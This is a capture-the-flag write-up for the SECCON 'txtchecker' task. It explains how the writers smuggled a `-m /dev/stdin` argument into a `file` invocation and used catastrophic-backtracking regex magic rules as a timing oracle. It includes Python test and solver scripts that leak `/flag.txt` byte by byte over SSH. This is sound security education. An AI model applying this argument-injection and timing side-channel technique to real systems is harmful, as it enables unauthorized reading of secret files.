## txtchecker

In this task we received an archive with the environment that was run on the organizers server.

The clue of the task was to exfiltrate the flag that was located in `/flag.txt` by interacting with a `checker.sh` script:

```sh
#!/bin/bash
read -p "Input a file path: " filepath
file $filepath 2>/dev/null | grep -q "ASCII text" 2>/dev/null
# TODO: print the result the above command.
#   $? == 0 -> It's a text file.
#   $? != 0 -> It's not a text file.
exit 0
```

Additionally, the environment setup had a watcher that killed processes that were run for more than 10 seconds.

## Initial attempt

Initially, we thought that this would be a simple command injection bug, where we could provide an input like `$(execute something)` to execute a process that would e.g. send a flag to our server.
However, it turned out that bash, or rather its `read -p <string> <variable>` command does escape/quote the input properly, so it doesn't seem that a command injection is possible.

We then spent lots of time reading about `file` and its magic file formats and trying out various flags from it.
We also had an idea that maybe some unicode characters would allow us to escape the quoting or something, but we eventually found the solution and haven't tried this.

## Solution

At some point we thought that the 10 seconds limit for processes may be crucial here, as in: why didn't they limit the execution to e.g. 2 or 4 seconds?

So we came up with an idea that if we make `file ... | grep ...` execute for a very long time, then we would maybe be able to exfiltrate the flag byte by byte, and... it turned out that it was it!

We came up with an idea of using the `-m /dev/stdin` flag to provide the file a magic header specification can be provided in. By using `/dev/stdin` we were able to provide that specification from standard input through our connection.
Then, we also found out one can use a regex matcher in the magic specification and, that we can pass in the `/flag.txt` file multiple times to amplify the timings.
Well, actually, we passed it 10k times!

So, our initial approach/finding was just trying out things in shell and something like this worked:
```
file -m /dev/stdin /flag.txt /flag.txt /flag.txt /flag.txt …
0       regex         SECCO(M)++++++++          ASCII text %1001s
```

(where the second line was passed to /dev/stdin, actually I think we used `echo '...' | file ...` initially)

Here is a small script we created to test and amplify the timings:

```python
import os

flag = '/flag.txt ' * 10000

#cmdline  = "echo '0       search          SECCON          ASCII text %1001s' | file -m /dev/stdin {} 2>/dev/null | grep -q \"ASCII text\" 2>/dev/null".format(flag)
#cmdline2 = cmdline.replace('SECCON', "SECCOM")

cmdline  = "echo '0       regex         (((((S+E+C+C+O+N+)+)+)+)+)+          ASCII text %1001s' | file -m /dev/stdin {} 2>/dev/null | grep -q \"ASCII text\" 2>/dev/null".format(flag)
cmdline2  = "echo '0       regex         (((((S+E+C+C+O+M+)+)+)+)+)+          ASCII text %1001s' | file -m /dev/stdin {} 2>/dev/null | grep -q \"ASCII text\" 2>/dev/null".format(flag)

#print(cmdline)

import time

p1 = time.time()
#os.system('time %s' % cmdline)
os.system(cmdline)
p2 = time.time()
#os.system('time %s' % cmdline)
os.system(cmdline2)
p3 = time.time()

print(p2-p1, p3-p2)
```

Then, our big problem was "how to pass this input to ssh", since the checker.sh script was hosted in a docker container and was exposed to us through a ssh connection.

That was problematic. We tried pwntools, pexpect and then paramiko. That finally worked and we brute forced the timings byte by byte to get a flag.

Of course we also had to run it on a server that was colocated closer to the organizers servers, but yeah, that happens :).

Here is the final solver script:

```python
import paramiko
import paramiko.client
import string
from time import time


flag = '/flag.txt ' * 10000
to_send = "-m /dev/stdin {}\n".format(flag).encode()
#host = localhost
host = 'txtchecker.seccon.games'

def try_prefix(prefix):
    c = paramiko.client.SSHClient()
    c.set_missing_host_key_policy(paramiko.client.AutoAddPolicy)
    c.connect(hostname=host, port=2022, username='ctf', password='ctf')
    stdin, stdout, stderr = c.exec_command('/app/checker.py')

    stdin.write(to_send)
    stdin.write("0       regex         {}          ASCII text %1001s\n".format(prefix).encode())
    start_t = time()
    stdin.close()

    assert(stdout.channel.recv_exit_status() == 0)

    end_t = time()
    c.close()

    return (end_t - start_t)

known_prefix = 'SECCON{'
alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + '_'

#print("SECCOM")
#print(try_prefix("SECCO(M)++++++++++++"))
#print("SECCON")
#print(try_prefix("SECCO(N)++++++++++++"))
print("SECCOM")
print(try_prefix("SECCO(M)++++++++"))
print("SECCON")
print(try_prefix("SECCO(N)++++++++"))


while True:
    times = []
    for ch in alphabet:
        flag_candidate = known_prefix + ch
        regex = known_prefix + '(' + ch + ')++++++++'
        regex = regex.replace('{', '.')
        t = try_prefix(regex)
        times.append( (t, ch) )
        print(flag_candidate, t)
    times.sort()

    known_prefix = known_prefix + times[0][1]
    print("FOUND NEW FLAG:", known_prefix)
 ```
 
 
And the flag was: `SECCON{reDo5L1feS}` (if I recall correctly :D)
